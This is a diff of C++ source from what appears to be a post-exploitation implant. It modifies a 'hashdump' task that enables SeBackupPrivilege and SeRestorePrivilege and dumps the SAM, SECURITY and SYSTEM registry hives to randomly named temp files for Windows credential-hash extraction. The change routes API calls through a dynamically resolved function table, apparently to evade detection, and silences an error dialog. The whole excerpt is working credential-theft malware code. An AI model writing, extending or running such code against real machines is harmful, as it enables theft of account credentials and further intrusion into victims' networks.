@@ -4,27 +4,30 @@ namespace Task
 {
     namespace Helper::Hashdump
     {
-        BOOL SaveRegHive(const std::wstring& wHiveKey, const std::wstring& wSavePath)
-        {
+        BOOL SaveRegHive(
+            Procs::PPROCS pProcs,
+            const std::wstring& wHiveKey,
+            const std::wstring& wSavePath
+        ) {
             HKEY hKey;
-            LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, wHiveKey.c_str(), 0, KEY_READ, &hKey);
+            LONG result = pProcs->lpRegOpenKeyExW(HKEY_LOCAL_MACHINE, wHiveKey.c_str(), 0, KEY_READ, &hKey);
             if (result != ERROR_SUCCESS)
             {
                 if (result == ERROR_ACCESS_DENIED)
                 {
-                    Stdout::DisplayMessageBoxA("ERROR_ACCESS_DENIED", "RegOpenKeyExW");
+                    // Stdout::DisplayMessageBoxA("ERROR_ACCESS_DENIED", "RegOpenKeyExW");
                 }
                 return FALSE;
             }
 
-            result = RegSaveKeyW(hKey, wSavePath.c_str(), nullptr);
+            result = pProcs->lpRegSaveKeyW(hKey, wSavePath.c_str(), nullptr);
             if (result != ERROR_SUCCESS)
             {
-                RegCloseKey(hKey);
+                pProcs->lpRegCloseKey(hKey);
                 return FALSE;
             }
 
-            RegCloseKey(hKey);
+            pProcs->lpRegCloseKey(hKey);
             return TRUE;
         }
     }
@@ -33,8 +36,10 @@ namespace Task
     {
         // Enable privileges
         HANDLE hToken;
-        if (!OpenProcessToken(NtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
-        {
+        if (!pState->pProcs->lpOpenProcessToken(
+            NtCurrentProcess(),
+            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken
+        )) {
             return L"Error: Failed to open token handle.";
         }
         if (!System::Priv::PrivilegeSet(
@@ -43,7 +48,7 @@ namespace Task
             SE_BACKUP_NAME,
             TRUE
         )) {
-            CloseHandle(hToken);
+            pState->pProcs->lpCloseHandle(hToken);
             return L"Error: Failed to set SeBackupPrivilege.";
         }
         if (!System::Priv::PrivilegeSet(
@@ -52,7 +57,7 @@ namespace Task
             SE_RESTORE_NAME,
             TRUE
         )) {
-            CloseHandle(hToken);
+            pState->pProcs->lpCloseHandle(hToken);
             return L"Error: Failed to set SeRestorePrivilege.";
         }
 
@@ -64,15 +69,15 @@ namespace Task
         std::wstring wSystemPath = wTempPath + L"\\" + Utils::Random::RandomString(8);
 
         // Save registry hives.
-        if (!Helper::Hashdump::SaveRegHive(L"SAM", wSamPath))
+        if (!Helper::Hashdump::SaveRegHive(pState->pProcs, L"SAM", wSamPath))
         {
             return L"Error: Failed to save SAM.";
         }
-        if (!Helper::Hashdump::SaveRegHive(L"SECURITY", wSecurityPath))
+        if (!Helper::Hashdump::SaveRegHive(pState->pProcs, L"SECURITY", wSecurityPath))
         {
             return L"Error: Failed to save SECURITY.";
         }
-        if (!Helper::Hashdump::SaveRegHive(L"SYSTEM", wSystemPath))
+        if (!Helper::Hashdump::SaveRegHive(pState->pProcs, L"SYSTEM", wSystemPath))
         {
             return L"Error: Failed to save SYSTEM.";
         }
